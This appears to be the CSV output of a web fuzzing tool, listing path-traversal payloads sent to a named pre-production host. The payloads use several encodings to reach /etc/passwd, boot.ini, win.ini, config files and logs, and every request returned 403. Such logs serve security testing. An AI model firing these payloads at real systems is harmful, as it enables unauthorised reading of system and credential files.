FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,27.518289ms,
../config.js,https://app-preprod-sandbox.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,27.913131ms,
../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,27.603592ms,
./../../../../../../../../../etc/passw*,https://app-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,31.987774ms,
../../boot.ini,https://app-preprod-sandbox.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,28.313507ms,
../../../logs/error.log,https://app-preprod-sandbox.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,27.722189ms,
..///etc/passwd,https://app-preprod-sandbox.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,28.498055ms,
file/../../../../../../../../etc,https://app-preprod-sandbox.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,27.003044ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://app-preprod-sandbox.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,27.44565ms,
./../../../../../../../../../etc/*,https://app-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,27.159443ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,28.050014ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,27.531844ms,
